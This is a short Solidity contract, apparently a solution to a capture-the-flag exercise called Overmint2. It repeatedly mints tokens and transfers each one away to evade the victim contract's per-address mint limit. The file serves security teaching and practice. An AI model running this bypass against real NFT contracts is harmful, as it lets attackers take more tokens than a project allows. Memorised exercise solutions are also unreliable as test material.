// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.11;

import {Overmint2} from "./Overmint2.sol";
import "hardhat/console.sol";

contract Overmint2Attacker {
    address public victim;

    constructor(address _victim) {
        victim = _victim;
    }

    function attack() public {
        for (uint256 i = 0; i < 5; i++) {
            Overmint2(victim).mint();
            Overmint2(victim).transferFrom(address(this), msg.sender, Overmint2(victim).totalSupply());
        }
    }
}
